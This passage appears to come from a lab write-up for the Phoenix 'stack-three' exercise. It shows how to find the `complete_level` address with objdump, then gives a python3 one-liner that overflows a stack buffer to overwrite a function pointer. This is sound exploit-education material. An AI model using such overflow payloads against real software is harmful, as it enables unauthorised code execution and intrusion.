  exit(0);
}

## Solution

To solve this we have to jump to the `complete_level` function. We can find it in the symbol table with `objdump`, and then overflow `locals.buffer` to fill `*fp` with it's address.

1. `objdump -t /opt/phoenix/amd64/stack-three | grep complete_level` 
   1. results: `000000000040069d g     F .text	0000000000000018 complete_level`
   2. The first field is the target
2. `python3 -c 'print("A"*63 + "\x9d\x06\x40\x00\x00\x00\x00\x00")' | /opt/phoenix/amd64/stack-three`
